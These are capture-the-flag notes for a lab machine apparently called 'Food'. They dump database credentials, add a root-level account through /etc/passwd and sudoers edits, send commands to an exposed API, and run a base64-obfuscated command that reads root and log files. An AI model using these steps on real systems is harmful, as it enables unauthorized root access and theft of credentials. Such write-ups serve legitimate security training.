# Food
## Ramen
 1. `mysql -u root -h food.thm -p` password is `root`
 2. `select * from user` now you have user `ramen : noodlesRTheBest`
 3. `ssh ramen@food.thm`
 4. `nc -nvlp 8888`
 5. ### Universal Priv. Esc.
 6. `/usr/bin/vim.basic /etc/passwd` and add `user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root:/bin/bash` password is `pass123`
 7. `/usr/bin/vim.basic /etc/sudoers` and add `user3 ALL=(ALL:ALL) ALL`
## Bread
1. `curl -d "command" food.thm:15065/api/cmd`

### Not Tested Priv. Esc.
1. https://www.exploit-db.com/exploits/41154
# Flags
1. /root/flag
2. /root/.profile
3. /root/.mysql_history
4. /home/bread/flag
5. /home/food/.flag
6. /home/tryhackme/flag7
7. /var/flag.txt
8. /var/log/auth.log

### Read All Flags
```
echo Y2F0IC9yb290L2ZsYWc7Y2F0IC9yb290Ly5wcm9maWxlO2NhdCAvcm9vdC8ubXlzcWxfaGlzdG9yeTtjYXQgL2hvbWUvYnJlYWQvZmxhZztjYXQgL2hvbWUvZm9vZC8uZmxhZztjYXQgL2hvbWUvdHJ5aGFja21lL2ZsYWc3O2NhdCAvdmFyL2ZsYWcudHh0O2NhdCAvdmFyL2xvZy9hdXRoLmxvZw== |base64 -d |sh
```
